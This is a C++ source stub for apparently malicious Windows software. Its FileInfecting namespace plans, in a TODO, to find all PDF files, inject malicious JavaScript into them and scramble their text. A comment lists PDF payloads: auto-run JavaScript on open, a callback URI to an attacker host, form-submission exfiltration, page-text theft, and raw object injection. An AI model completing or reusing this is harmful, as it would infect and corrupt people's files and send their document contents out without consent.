#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>

namespace FileInfecting {
	// TODO: 3 functions, one for searching for all .pdf files;
	// other for infecting them with a malicious JS code,
	// and another for randomly replacing text with "cursed" unicode
	/*
+------------------------+----------------------------------------------------------+--------------------------------------------------------------------------+
| Goal                   | Payload Snippet                                          | Notes                                                                    |
+------------------------+----------------------------------------------------------+--------------------------------------------------------------------------+
| JavaScript on open     | /OpenAction << /S /JavaScript /JS (app.alert(1)) >>      | Good for Acrobat / Reader testing.                                       |
| JavaScript on click    | /A << /S /JavaScript /JS (app.alert(1)) >>               | Useful when you control an annotation or link action.                    |
| Additional actions     | /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>     | /O = open/focus-style action, /E = mouse-enter, etc.                     |
| Blind callback         | /A << /S /URI /URI (https://attacker.tld/) >>            | Basic out-of-band reachability check.                                    |
| Blind SSRF / POST      | Inject a widget/text field and call this.submitForm(...) | Stronger than a simple /URI because you can send field values.           |
| Content theft          | for (...) this.getPageNthWord(...)                       | Especially useful in Acrobat and in PortSwigger's PDFium research chain. |
| New object injection   | \nendobj\n10 0 obj\n<< ... >>\nendobj                    | Works if the generator lets you inject raw line breaks.                  |
+------------------------+----------------------------------------------------------+--------------------------------------------------------------------------+
	*/
}